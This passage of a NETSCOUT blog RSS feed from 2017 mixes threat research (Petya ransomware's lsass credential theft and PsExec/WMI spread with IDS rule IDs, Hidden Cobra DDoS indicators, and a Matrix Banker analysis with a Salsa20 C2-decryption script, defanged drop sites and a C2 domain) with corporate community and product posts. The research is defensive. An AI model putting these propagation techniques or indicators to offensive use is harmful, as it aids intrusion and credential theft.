<p>Amidst this deluge of information (and misinformation), we wanted to make sure that the association of Petya with WannaCry did not obscure some important differences. In particular, the EternalBlue-based propagation mechanism, mitigated by patching MS17-010, is not the only method employed by Petya to spread. Another propagation method employed by Petya is not thwarted by simply patching. According to Kaspersky [5], once Petya has compromised a machine, it will begin to hijack local credentials from the Windows Local Security Authority (lsass.exe) then leverage those credentials via PsExec or WMI in an attempt to remotely compromise other systems on the local network. In many enterprises, this activity will not be blocked and is likely to fly under the radar as typical remote administration activity. Afterall, PsExec is a legitimate Windows SysInternals command line tool and WMI stands for Windows Management Instrumentation. If a widely used administrative credential is compromised, it could very quickly be game over for many systems regardless of whether the patch for MS17-010 has been applied or not.</p>

<p>Another important difference between Petya and WannaCry is that there is no “KillSwitch” [6] for Petya. Indeed, contrary to many reports, ASERT has found no evidence that Petya has any form of command-and-control.</p>

<p>In conclusion, avoid any false sense of security that may derive from patching MS17-010 and heed the longstanding calls for appropriate network segmentation to limit the damage from Petya and other malware. Finally, note that the following ET Pro rules appear to fire on Petya propagation behavior and, thus, can be used for detection using network security products such as Arbor Networks Spectrum:</p>

<ul>
	<li>2001569 - ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection</li>
	<li>2012063 - ET NETBIOS Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference</li>
	<li>2024297 - ET CURRENT_EVENTS ETERNALBLUE Exploit M2 MS17-010</li>
</ul>

<p><strong>References</strong></p>

<p>[1] <a href="https://twitter.com/hashtag/notpetya">https://twitter.com/hashtag/notpetya</a></p>

<p>[2]&nbsp;<a href="https://en.censor.net.ua/news/445650/list_of_ukrainian_companies_and_agencies_whose_websites_were_attacked_by_hackers_on_june_27_live_updates">https://en.censor.net.ua/news/445650/list_of_ukrainian_companies_and_agencies_whose_websites_were_attacked_by_hackers_on_june_27_live_updates</a></p>

<p>[3] <a href="https://www.nytimes.com/2017/06/27/technology/global-ransomware-hack-what-we-know-and-dont-know.html">https://www.nytimes.com/2017/06/27/technology/global-ransomware-hack-what-we-know-and-dont-know.html</a></p>

<p>[4] <a href="https://en.wikipedia.org/wiki/EternalBlue">https://en.wikipedia.org/wiki/EternalBlue</a></p>

<p>[5] <a href="https://securelist.com/schroedingers-petya/78870/">https://securelist.com/schroedingers-petya/78870/</a></p>

<p>[6] <a href="https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/">https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">802d60d5-03f9-4054-992b-3ba370b9fc20</guid>
    <pubDate>Tue, 27 Jun 2017 20:30:01 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Building Community at Work To Support Military Families</title>
  <link>http://localhost:7996/blog/building-community-work-support-military-families</link>
  <description>NETSCOUT’s Silicon Valley team engaged in a different type of “engineering” project by picking up hammers and nails to construct two playhouses donated to a local chapter of Blue Star Moms, a non-profit organization dedicated to serving military personnel, veterans and their families from all branches of the United States Armed Forces. This is NETSCOUT’s seventh consecutive...</description>
  <content:encoded><![CDATA[<p>NETSCOUT’s Silicon Valley team engaged in a different type of “engineering” project by picking up hammers and nails to construct two playhouses donated to a local chapter of <a href="http://www.bluestarmoms.org/">Blue Star Moms</a>, a non-profit organization dedicated to serving military personnel, veterans and their families from all branches of the United States Armed Forces. </p>

<p>This is NETSCOUT’s seventh consecutive year participating in the playhouse program with <a href="http://www.habitatebsv.org/">Habitat for Humanity East Bay Silicon Valley</a>.  Each year the team looks forward to the project as a way to both assist children of families with members actively serving in the military and get to know fellow employees. </p>

<p>In the last year, we welcomed employees who were formerly part of Fluke Networks and VSS Monitoring, as part of Danaher’s Communications Business acquisition, into our San Jose office.  “Sometimes we get so busy with our day-to-day job we don’t make the time to get to know people in other departments.  With the playhouse project, there is usually a great turnout from all areas of the company, and often people see what’s going on outside and spontaneously decide to join in,” said Shalini Das, senior human resources generalist at NETSCOUT. </p>

<h5 data-fontsize="18" data-lineheight="27"><strong>Working Together While Supporting Military Families</strong></h5>

<p><img alt="NETSCOUT Employees Working Together " data-entity-type="file" data-entity-uuid="70904fb2-728d-4db9-89fa-6a939d47ea3c" height="244" src="http://localhost:7996/sites/default/files/inline-images/habitat%20for%20humanity%201.jpg" style="margin-left:15px;" width="366" class="align-right" /></p>

<p>Shalini noted that a number of employees helped prepare for the build day, including setting up the parking lot for the project, recruiting volunteers and planning how to decorate the playhouses.  Habitat provides information about the children’s ages, favorite characters or activities, colors, and employees’ creativity takes over from there.  This year the team had the challenge of creating beach and police-themed playhouses for the children.  In the process of building a playhouse you find out who is artistic, who is a stickler about measuring twice, and who likes to play with power tools!  It’s a fun way to see a different side of people. </p>

<p>The favorite part of the day is when the families arrive to pick up their playhouses.  Not only do employees have the satisfaction of completing the project, they also have the opportunity to greet the families and let them know they appreciate their service.  But the expression of joy on the children’s faces is by far the best part.  Nothing beats seeing the smiles and amazement as the kids realize this is their very own playhouse!</p>

<p>“As a company, it is inspiring to do something in return for those who serve our country.  This activity brings together our employees to participate in a unique way of thanking our military families for their dedication and sacrifice for our country,” said Mike Ratzlaff, vice president, engineering and San Jose site leader at NETSCOUT. “Our efforts will bring excitement and opportunities for imaginative play to these children while supporting Habitat’s mission of building homes, communities and hope.”</p>

<p>The Habitat for Humanity East Bay/Silicon Valley Playhouse Program is a unique team building opportunity where volunteers work together to construct usable and durable children’s playhouses, which are then donated to families and community charities in the area. The playhouse program helps fund the construction of local affordable housing through Habitat EBSV’s mission.  Habitat for Humanity East Bay/Silicon Valley has donated over 450 playhouses to organizations including Blue Star Moms and Capes4heroes.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/habitat%20for%20humanity%202.jpg" length="890371" type="image/jpeg"/>
    <guid isPermaLink="false">d9d13a1d-c1c6-4ea1-bca7-701d5178b56f</guid>
    <pubDate>Tue, 20 Jun 2017 12:37:23 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Karen McCloskey</dc:creator>
    </item>
<item>
  <title>Pivoting off Hidden Cobra Indicators</title>
  <link>http://localhost:7996/blog/asert/pivoting-hidden-cobra-indicators</link>
  <description>On June 13th 2017, US-CERT issued a joint Technical Alert (TA17-164A) entitled Hidden Cobra – North Korea’s DDoS Botnet Infrastructure. The alert, which was the result of analytic efforts between the Department of Homeland Security (DHS) and Federal Bureau of Investigation (FBI), included a list of IP addresses “linked to systems infected with DeltaCharlie”. DeltaCharlie is a...</description>
  <content:encoded><![CDATA[<p>On June 13th 2017, US-CERT issued a joint Technical Alert (TA17-164A) entitled <em>Hidden Cobra – North Korea’s DDoS Botnet Infrastructure</em>. The alert, which was the result of analytic efforts between the Department of Homeland Security (DHS) and Federal Bureau of Investigation (FBI), included a list of IP addresses “linked to systems infected with DeltaCharlie”. DeltaCharlie is a malware originally described by a Novetta-led coalition as a DDoS tool in the arsenal of the Lazarus group [1]. The US-CERT report refers to the Lazarus group as Hidden Cobra, and associates the groups activity with the North Korean government.</p>

<p>It is not clear based on the information from the report whether the IPs listed in the report were part of a command and control infrastructure or simply bots or both. It’s also not clear from the report whether some of the IPs were simply “innocent” reflectors/amplifiers. To understand whether the IP addresses listed were directly involved in DDoS attacks, we correlated them with attack information observed by Arbor’s ATLAS infrastructure. Arbor’s ATLAS infrastructure collects anonymized DDoS attack data from nearly 400 globally distributed service providers running Arbor’s Intelligent DDoS Mitigation Solutions (IDMS’s).</p>

<h2>Summary of Attack Data</h2>

<p>The following data points were derived from DDoS attack data reported to ATLAS in the 105-day period between 01MAR17 and 13JUN17:</p>

<table border="1">
	<tbody>
		<tr>
			<td>Number of IP Addresses provided in the TA17-164A alert:</td>
			<td>632</td>
		</tr>
		<tr>
			<td>Number of TA17-164A IP addresses participating in at least one DDoS attack:</td>
			<td>24 (3.8%)</td>
		</tr>
		<tr>
			<td>Number of TA17-164A IP addresses participating in more than one DDoS attack:</td>
			<td>16</td>
		</tr>
		<tr>
			<td>Total number of DDoS attacks involving at least one TA17-164A IP Address:</td>
			<td>164</td>
		</tr>
		<tr>
			<td>Largest Attack (Bandwidth):</td>
			<td>4.30 Gbps</td>
		</tr>
		<tr>
			<td>Largest Attack (Throughput):</td>
			<td>4.25 Mpps</td>
		</tr>
		<tr>
			<td>Largest Attack (Duration):</td>
			<td>44 Hours</td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>

<p>Of note is here is the small peak attack bandwidth. Reflection/Amplification attacks, which are the primary attack vector used by DeltaCharlie, have been known to exceed bandwidth sizes two orders of magnitude larger than this. Of course, 4.3 Gbps is more than enough to disrupt infrastructure that does not have the appropriate defenses against DDoS attacks. It is important to note the following:</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<ul>
	<li>ATLAS data includes approximately 1/3 of Internet traffic so some attacks may not be seen in the data</li>
	<li>Most attack data that is shared with ATLAS is anonymized so that source or destination IP address information is not provided</li>
</ul>

<p>Therefore, the actual percentage of hosts using TA17-164A provided IP addresses is likely higher than the 3.8% observed by ATLAS.</p>

<h2>Geo-Location of Attacking IP Addresses</h2>

<p>The following is the geo-location of the 24 IP addresses provided in the TA17-164A report that were observed by ATLAS to be participating in at least one DDoS attack between 01MAR17 and 13JUN17:</p>

<p style="text-align: center;"><a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/HiddenCobra-GeoLocationOfAttackingIPs.png"><img alt="" class="alignnone size-full wp-image-9054" height="494" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/HiddenCobra-GeoLocationOfAttackingIPs.png" width="616" /></a></p>

<p>Note that different IP addresses may come from the same location, thus, only 16 red dots appear rather than 24. While the largest concentration of IP addresses in the TA17-164A alert were in Volgograd, Russian Federation, the largest concentration of the subset of addresses observed by ATLAS launching DDoS attacks was in Saudi Arabia (6 of 24), followed by the United Arab Emirates (5 of 24).</p>

<h2>Daily Attack Frequency</h2>

<p>The following chart depicts the number of DDoS attacks per day where at least one IP address in the TA17-164A alert was observed as a source address participating in the attack: <a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/DailyAttackFrequency.png"><img alt="" class="alignnone size-full wp-image-9055" height="595" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/DailyAttackFrequency.png" width="1931" /></a> At least one attack occurred on most days between 01MAR17 and 13JUN17. The largest span of consecutive days where no attacks occurred began on April 5th. Since DDoS activity so often correlates with geopolitical activity, it is interesting to see what was occurring around that time. In this case, we note that April 5th is the day after North Korea launched a missile into the Sea of Japan [2]. Of course, it is pure speculation as to whether there is any correlation between these two events.</p>

<h2>Target Countries</h2>

<p>The following chart lists the top destination countries associated with the 164 reported DDoS attacks between 01MAR17 and 13JUN17 where at least one IP address in the TA17-164A alert was observed as a source address:</p>

<table>
	<tbody>
		<tr>
			<th>Country</th>
			<th>Number of Attacks</th>
		</tr>
		<tr>
			<td>United States:</td>
			<td>79 (48%)</td>
		</tr>
		<tr>
			<td>Great Britain:</td>
			<td>11 (7%)</td>
		</tr>
		<tr>
			<td>Australia:</td>
			<td>9 (6%)</td>
		</tr>
		<tr>
			<td>France:</td>
			<td>9 (6%)</td>
		</tr>
		<tr>
			<td>Saudi Arabia:</td>
			<td>6 (4%)</td>
		</tr>
		<tr>
			<td>Singapore:</td>
			<td>5 (3%)</td>
		</tr>
		<tr>
			<td>Other:</td>
			<td>45 (26%)</td>
		</tr>
	</tbody>
</table>

<h2>&nbsp;</h2>

<h2>Attack Types</h2>

<p>Reflection/Amplification attacks were present in 67% of the reported attacks. Roughly an equal mix of LDAP and DNS based reflection/amplification. This is interesting because while DNS is a known reflection/amplification vector supported by DeltaCharlie, LDAP is not. Another nagging point of confusion is if the IP addresses in the TA17-164A alert include DeltaCharlie bots launching reflection/amplification attacks (as one might reasonably expect), then the victim would never even see those IP addresses! Instead, the victim would observe attack traffic from the open reflectors being abused by the bot. This raises the possibility that TA17-164A listed open reflectors that were simply “innocent” victims abused by DeltaCharlie or, since DeltaCharlie isn’t known to support LDAP reflection/amplification, perhaps some other bot entirely. The advisory certainly leaves some open questions.</p>

<h2>Mitigation</h2>

<p>The DDoS attack methodologies which the DeltaCharlie botnet is known to support - DNS reflection/amplification attacks, ntp reflection/amplification attacks, and chargen reflection/amplification attacks - are well-understood, and can be mitigated using intelligent DDoS mitigation systems (IDMSes) such as Arbor TMS and Arbor APS. The reflection/amplification attack vectors that are not supported by DeltaCharlie, such as the LDAP reflection/amplification attacks noted above, can also be mitigated using an IDMS such as Arbor TMS or Arbor APS. Reflection/amplification countermeasures resident in Arbor IDMS systems would be appropriate for mitigating these types of attacks.</p>

<h2>Conclusion</h2>

<p>This post describes observed DDoS activity emanating from a subset of IP addresses provided in US-CERT’s Technical Alert (TA17-164A) entitled <em>Hidden Cobra – North Korea’s DDoS Botnet Infrastructure</em>. It also illuminates the importance of providing context when sharing indicators. The Hidden Cobra alert is vague in its characterization of the provided IP address-based indicators. It is not clear whether the IPs listed in the report are part of a command and control infrastructure, simply bots or both. It’s not even clear that some of the IPs aren’t simply “innocent” reflectors.</p>

<p>This lack of context makes it difficult for responders to act. Security analysts would treat a list of command-and-control servers differently from a list of bots, and differently from a list of reflectors. This creates risk if implicitly trusting the US-CERT indicators. Blindly loading such indicators into security systems could potentially cause more harm than good [3]. This can erode trust in times when it is needed most. Understanding and communicating context is as important as listing indicators of compromise directly.</p>

<h2>References</h2>

<p>[1]&nbsp;<a href="https://www.operationblockbuster.com/">https://www.operationblockbuster.com/</a></p>

<p>[2]&nbsp;<a href="https://www.nknews.org/2017/04/north-korea-launches-projectile-towards-sea-of-japan-south-korean-jcs/">https://www.nknews.org/2017/04/north-korea-launches-projectile-towards-…</a></p>

<p>[3]&nbsp;<a href="https://threatpost.com/what-hack-burlington-electric-speaks-out/122860/">https://threatpost.com/what-hack-burlington-electric-speaks-out/122860/</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">f23ae073-2f6c-4174-92c1-e25140c7c726</guid>
    <pubDate>Sun, 18 Jun 2017 18:05:56 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Another Banker Enters the Matrix</title>
  <link>http://localhost:7996/blog/asert/another-banker-enters-matrix</link>
  <description>This post takes a look at a new banking malware that has, so far, been targeting financial institutions in Latin America—specifically, Mexico and Peru. Initially, we’ve called it “Matrix Banker” based on its command and control (C2) login panel, but it seems that “Matrix Admin” is a template available for the Bootstrap web framework. Proofpoint calls it “Win32/RediModiUpd”...</description>
  <content:encoded><![CDATA[<p>This post takes a look at a new banking malware that has, so far, been targeting financial institutions in Latin America—specifically, Mexico and Peru. Initially, we’ve called it “Matrix Banker” based on its command and control (C2) login panel, but it seems that “Matrix Admin” is a template available for the Bootstrap web framework. Proofpoint <a href="https://www.proofpoint.com/us/daily-ruleset-update-summary-20161108">calls</a> it “Win32/RediModiUpd” based on a debugging string from an earlier sample.</p>

<p>The malware is under active development, but as with some of the other banking trojans we’ve analyzed, it’s difficult to assess how far and wide this threat will go while it’s still so new. Will it become a persistent threat like <a href="http://asert.arbornetworks.com/let-pandas-zeus-zeus-zeus-zeus/">Panda Banker </a>or have a <a href="https://krebsonsecurity.com/2017/04/self-proclaimed-nuclear-bot-author-weighs-u-s-job-offer/">fate</a> more like <a href="http://asert.arbornetworks.com/dismantling-nuclear-bot/">Nuclear Bot</a>?</p>

<h2>Samples</h2>

<p>The sample analyzed for this post is available on <a href="https://www.virustotal.com/en/file/997544ba1db9c28d8552801411a4ca29ef321347e6912c562d4bfb35f3dd4bb9/analysis/">VirusTotal</a>. It was compiled on 2017-05-26 and has the following PDB debugging string:</p>

<pre>
<strong>C:\Users\W7\Downloads\Project\Bin\Loader.pd</strong></pre>

<p><strong>The Matrix Loaded</strong></p>

<p>As suggested by the PDB string, the sample starts off as a loader. It performs the following tasks:</p>

<ul>
	<li>Creates a “LoaderMutex” mutex</li>
	<li>Sets up Registry Run persistence using “GITSecureService” as the value name.</li>
	<li>Extracts a 32-bit and 64-bit DLL named “main_32.dll / main_64.dll” from a resource named “BINARY”.</li>
	<li>Using the “<a href="http://www.securiteam.com/securityreviews/6P0050KN5U.html">ReflectiveLoader</a>” technique and code, injects the appropriate DLL into chrome.exe, firefox.exe, iexplore.exe, or microsoftedgecp.exe.</li>
</ul>

<p>Main DLLOnce the main DLL is injected in a browser, it starts by hooking the appropriate browser functions (e.g. PR_Read and PR_Write for Firefox) to setup a “<a href="https://en.wikipedia.org/wiki/Man-in-the-browser">man-in-the-browser</a>” (MitB).</p>

<p>&nbsp;</p>

<p>It then phones home to its C2 server to get the webinject config. The request looks like this:</p>

<p><a href="http://asert.arbornetworks.com/another-banker-enters-matrix/phonehome-5/" rel="attachment wp-att-9031"><img alt="" class="alignnone size-large wp-image-9031" height="875" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/phonehome-1024x996.png" width="900" /></a></p>

<p>The URI path and file are hardcoded, but we’ve seen other paths in other samples. “uuid” is randomly generated and “country” is currently left blank—though there is placeholder code for it.</p>

<p>Responses from the C2 are hex encoded and encrypted using the <a href="https://en.wikipedia.org/wiki/Salsa20">Salsa20</a> crypto algorithm. This is the first malware family that we’ve seen that uses this algorithm. The following Python snippet decrypts the response:</p>

<pre>
<strong>import sys</strong>

<strong># https://pypi.python.org/pypi/salsa20/0.3.0
import salsa20

fp = open(sys.argv[1], "rb")
data = fp.read()
fp.close()

iv = "K\x84\x8eH\xf1]E\xa5"
key = "\xa1\x9cA\x89\xb4\x9d\x15ae\xf1a\x8bLQj\x16\xf1l\x18\x1d\x81\xb8\x18\x18\xe1\x81e\x1c!\xb8\\e"

data_nohex = data.replace("\n", "").decode("hex")
plain = salsa20.Salsa20_xor(data_nohex, iv, key)
print plain</strong></pre>

<p>So far the key and initialization vector (IV) have been the same for all the samples we’ve analyzed. An example webinject config looks like this:</p>

<p><a href="http://asert.arbornetworks.com/another-banker-enters-matrix/webinjects/" rel="attachment wp-att-9032"><img alt="" class="alignnone size-large wp-image-9032" height="95" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/06/webinjects-1024x108.png" width="900" /></a></p>

<p>While functional, the webinject format looks to be under construction. Earlier samples use a different, simpler format and there is plenty of work to do to catch up with the industry standard Zeus webinjects. Rules are “\n” separated and there are two types: “rule1” and “rule2”. So far we’ve only seen “rule2”s. The targeted financial institution is specified in “targeturl”. The rest of the pieces, which are “&amp;br&amp;” delimited, are eventually concatenated together and injected into the page if the browser visits a targeted URL.</p>

<p>In this example the code that is injected is a HTML and JavaScript redirect that automatically redirects the browser to a phishing page hosted on “llinea[.]com” that looks exactly like the targeted financial institution. Hoping the victim doesn’t notice the redirect, the threat actor will harvest the victim’s banking credentials.</p>

<h2>Campaign</h2>

<p>Per VirusTotal, the analyzed sample was first seen in the wild on 2017-05-29 and being distributed by the following sites:</p>

<ul>
	<li>hxxp://neext[.]com[.]mx/Loader.exe</li>
	<li>hxxp://notaria94[.]com[.]mx/real.exe</li>
</ul>

<p>Furthermore we can link the second drop site to an instance of Beta Bot (available on <a href="https://www.virustotal.com/en/file/eb483d4f8c71a234f70b490bb38d841c72453ed5c9bb0049d9affd2afe41cf23/analysis/">VirusTotal</a>) and see it dropping Matrix Banker. The two malwares also share a common C2 server, trtr44[.]cat.</p>

<h2>Conclusion</h2>

<p>This post has been a quick analysis of a new banking malware currently targeting countries in Latin America. It is too soon to assess how active and widespread this new family will become, but it is actively being developed and targeting financial institutions in the wild.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Another%20Banker%20Enters%20the%20Matrix.png" length="119390" type="image/png"/>
    <guid isPermaLink="false">8ad0cb28-3148-4fea-9518-2657b10ea7e8</guid>
    <pubDate>Fri, 09 Jun 2017 09:37:16 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Meeting Service Management Needs in Hybrid IT Environments</title>
  <link>http://localhost:7996/blog/meeting-service-management-needs-hybrid-it-environments</link>
  <description>Businesses today are increasingly relying on hybrid IT environments which combine legacy applications and networks with virtualized compute, storage and network workloads that exist on-premises and in the cloud. As companies migrate workloads into hybrid cloud environments, all too often a “lift and shift” approach is taken for expediency sake, rather than taking the time to...</description>
  <content:encoded><![CDATA[<p>Businesses today are increasingly relying on hybrid IT environments which combine legacy applications and networks with virtualized compute, storage and network workloads that exist on-premises and in the cloud. As companies migrate workloads into hybrid cloud environments, all too often a “lift and shift” approach is taken for expediency sake, rather than taking the time to customize applications to the cloud. Of course, one of the downsides to this type of strategy is that with less customization comes a higher cost of cloud services.&nbsp;</p>

<p>With these changes to IT infrastructures come some sizable impacts to service management needs at both the business and technical levels. At the business level, as companies develop new applications and attempt to deploy them as services in the production environment at a very rapid pace (sometimes with multiple releases per day), the need for highly effective management grows exponentially.</p>

<p>The technical requirements of hybrid cloud environments will require increased visibility into the workloads in the cloud to better manage service quality and performance. Without access to hypervisors in the cloud it becomes difficult to instrument workloads deployed in cloud environments to maintain high levels of availability and to quickly identify the root cause of disruptions and faults. What is needed is a tool that delivers dependency mapping across all service delivery domains, including applications, networks, servers, enablers and databases, revealing how everything is connected based on pervasive instrumentation of on-premises and cloud environments. This vital information must be made available to all IT teams within an organization, so they share common situational awareness, allowing them to reduce mean-time-to-repair (MTTR) and time wasted in war rooms.</p>

<h4><strong>The Paradigm Shift toward Software and Microservices&nbsp; </strong></h4>

<p>Over the course of the next 12 to 24 months, we expect to see a growing reliance on truly distributed architectures, such as microservices running in hybrid cloud environments on-premises and in the cloud.&nbsp; Because some applications will have “crown-jewels” data associated with them, security concerns may dictate that some of the microservices run in on-premises data centers, while other components of the same application will run as microservices in the cloud. To complicate things further, such a hybrid environment may operate across multiple, multi-vendor cloud providers.&nbsp;</p>

<p>Thus, there will be more containers and more independent pieces of software that must communicate with each other through APIs. In this complex environment, it will become increasingly important to be able to instrument everything, gain visibility into everything, and correlate and identify the interdependencies across these components of the microservices and their supporting infrastructure. &nbsp;&nbsp;</p>

<p>These changes are not going to happen overnight, but we are already seeing more and more microservices and containers being implemented. Clearly, the rapid pace of digital transformation is spurring the introduction of new business models, creating tremendous disruption. The adoption of an information-based economy is already occurring, as more and more companies begin to generate greater value from information than from physical assets. The data being harnessed to offer new applications and services to customers is fast becoming a key business differentiator.</p>

<p>At NETSCOUT, we are in the process of disrupting ourselves, as we migrate into a software company. Over our 30-year history, we established ourselves as an industry-leader with wire-data instrumentation products that physically reside in the datacenter. But now we are introducing a complementary software-based approach that offers pervasive instrumentation. This will allow our customers to instrument traffic flows, or wire-data, and application running in a variety of environments such as the datacenter server farms and the cloud. This software-based instrumentation would allow our customers to obtain critical insights into all interdependencies across the entire hybrid IT environment. By pairing our analytics products with “Smart Data” based on pervasive instrumentation, IT will be able to connect and monitor application and network performance in more pervasive ways than ever before.&nbsp;</p>

<p>A core result: meeting service management needs will become a far less daunting prospect.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/hybrid_it1200x480.jpg" length="122627" type="image/jpeg"/>
    <guid isPermaLink="false">08183b3f-ad53-4e66-9b7c-88f0efba0a1c</guid>
    <pubDate>Tue, 06 Jun 2017 15:37:28 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>Taking on Illiteracy One Reader at a Time</title>
  <link>http://localhost:7996/blog/taking-illiteracy-one-reader-time</link>
  <description>Once a year, NETSCOUT professionals lend a hand and attend the Literacy Instruction for Texas Volunteer Appreciation Brunch, recognizing and supporting those affected by learning disabilities including dyslexia or impairments from strokes and brain injuries.</description>
  <content:encoded><![CDATA[<p>Illiteracy is a big problem in this nation. And for one charitable organization in Texas, they’re doing something about it. It is estimated that by 2030, Dallas County’s population will reach 3.5 million and nearly one-third of them will be illiterate.</p>

<p>Founded in 1961 by a group of women in the National Council of Jewish Women, <a href="http://lift-texas.org/" target="_blank">Literacy Instruction For Texas (LIFT)</a> has been working to address this growing problem. Today, LIFT helps approximately 3,000 adults annually learn to read, write and speak basic English using an immersion program. A team of more than 375 volunteers help both English-speaking and non-English-speaking adults learn the language, as well as prepare to take the high school equivalency exam.</p>

<p>The importance of programs like this can’t be overstated. “In Texas, one in five adults can’t read at a functional level and that affects nearly every aspect of our society from inter-generational illiteracy and poverty all the way through workforce development, corporate relocation, the cost of healthcare, and criminal recidivism,” explained Lisa Hembry, President and CEO of LIFT. “Unfortunately, many people have fallen through the cracks in our public education system and never learn to read. Others are non-native speakers, or have learning difficulties, like dyslexia, or have had a stroke. Our core mission is designed to help these adults.”</p>

<p>LIFT works in collaboration with a number of other organizations including the Dallas Independent School District where they hold classes for adults.</p>

<h5 data-fontsize="18" data-lineheight="27"><strong>NETSCOUT Lends a Helping Hand</strong></h5>

<p><img alt="NETSCOUT LIFT " data-entity-type="file" data-entity-uuid="63571165-c09d-420b-9274-9519438ab748" src="http://localhost:7996/sites/default/files/inline-images/LIFT2.jpg" style="margin-left:15px;" class="align-right" />Once a year, the organization holds its Literacy Instruction for Texas Volunteer Appreciation Brunch. This is a special occasion where all of the active volunteers who teach classes, office support staff, employment coaches and mentors get to meet and interact with program organizers. For Lisa, the problem with this event has always been that setting up and running the brunch ends up being so time consuming that program organizers never really get a chance to mingle and meet all of the volunteers. That’s where NETSCOUT came in.</p>

<p>A group of nine NETSCOUT volunteers (including some family members) from the Plano, Texas office served as hosts of the elegant brunch, which was held at a private school that offers their facility to LIFT for the day.  The NETSCOUT crew took over all of the organizational responsibilities of the event, including setting up the facility, managing registration of attendees, serving food and beverages, and then tearing down and cleaning up afterwards. This freed up LIFT organizers to spend more time with volunteers.</p>

<p>“The NETSCOUT volunteers were truly amazing. They got there early, worked hard, stayed late to strike the event, and overall played a huge role in the success of the Volunteer Appreciation brunch,” added Lisa.</p>

<p>In addition to helping facilitate this event, the NETSCOUT volunteers had an invaluable opportunity to hear presentations from LIFT staff and volunteers about LIFT’s vital mission to “bend the trend” of adult illiteracy in Dallas County.</p>

<p>Further support for this important event included a $2500 team volunteer grant from NETSCOUT’s Heart of Giving program, which offset the cost of the brunch. This is a shining example of nonprofit collaboration, volunteer involvement and corporate engagement.</p>

<p>For the NETSCOUT volunteers involved, it was a rewarding opportunity to give back to the community. “Having worked at NETSCOUT for 10 years now, I’ve seen time and again employees stepping up and being very generous with their time when a charity needs assistance or donations,” concluded Ginny Dudek, Senior Technical Writer for NETSCOUT and team captain for the volunteer project. “As we did for LIFT, I’m proud to say my co-workers always answer the call.”</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/LIFT1200x480.jpg" length="255701" type="image/jpeg"/>
    <guid isPermaLink="false">a60e1139-4980-45ed-be00-1e8254406a7b</guid>
    <pubDate>Mon, 05 Jun 2017 10:17:37 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Zyklon Season</title>
  <link>http://localhost:7996/blog/asert/zyklon-season</link>
  <description>The ASERT research team has recently done some work reverse engineering a family of malware called "Zyklon H.T.T.P." that is written using the .Net framework. Zyklon (German for “cyclone”) is a large, multi-purpose trojan that includes support for a variety of malicious activities, including several different forms of DDoS attack, key logging and credential theft, SOCKS...</description>
  <content:encoded><![CDATA[<p>The ASERT research team has recently done some work reverse engineering a family of malware called "Zyklon H.T.T.P." that is written using the .Net framework. Zyklon (German for “cyclone”) is a large, multi-purpose trojan that includes support for a variety of malicious activities, including several different forms of DDoS attack, key logging and credential theft, SOCKS proxying, executing arbitrary code, etc. A summary of our findings regarding Zyklon's inner workings are documented in the <a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/05/zyklon_season.pdf">linked article</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">3d6e49c9-65e3-4d53-b586-7ddc01918e56</guid>
    <pubDate>Thu, 25 May 2017 10:21:32 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Observations from IoT World Summit 2017</title>
  <link>http://localhost:7996/blog/observations-iot-world-summit-2017</link>
  <description>Technologists, visionaries, and experts from all sectors of the economy recently converged on Santa Clara, California for the “World’s Largest IoT Conference”. What made this conference unique is that it wasn’t about the role that 5G, NB-IoT or other wireless protocols will play in enabling IoT, but rather it was about what people and organizations are doing and planning for...</description>
